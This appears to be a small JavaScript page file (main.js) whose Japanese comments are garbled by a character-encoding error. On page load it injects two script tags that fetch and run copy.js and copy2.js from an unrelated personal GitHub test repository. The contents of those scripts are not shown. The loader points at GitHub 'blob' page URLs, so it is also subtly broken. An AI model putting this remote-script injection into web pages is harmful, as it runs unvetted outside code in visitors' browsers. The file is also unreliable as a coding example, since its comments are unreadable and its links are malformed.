/*
 * �u���b�N�J����
 * 2015/12/21 �{�^���摜�̔�\���������s��Ȃ�
 */
/*
window.onload = function() {
    get();
};
 */
// main.js


// window �� load �C�x���g������������ generate �����s����
//window.addEventListener('load', generate);
//window.addEventListener('load', get2);
window.onload = function() {
    generate();
    get2();

};
function generate() {
    // �V���� script �v�f�𐶐�
    var scriptElement = document.createElement('script');
    scriptElement.src = 'https://github.com/akaina0112/Test/blob/main/copy2.js'; // �O���X�N���v�g�� URL ��ݒ�

    // head �v�f�� script �v�f��ǉ�
    document.head.appendChild(scriptElement);
}

function get2() {
    // �V���� script �v�f�𐶐�
    var scriptElement = document.createElement('script');
    scriptElement.src = 'https://github.com/akaina0112/Test/blob/main/copy.js'; // �O���X�N���v�g�� URL ��ݒ�

    // head �v�f�� script �v�f��ǉ�
    document.head.appendChild(scriptElement);
   }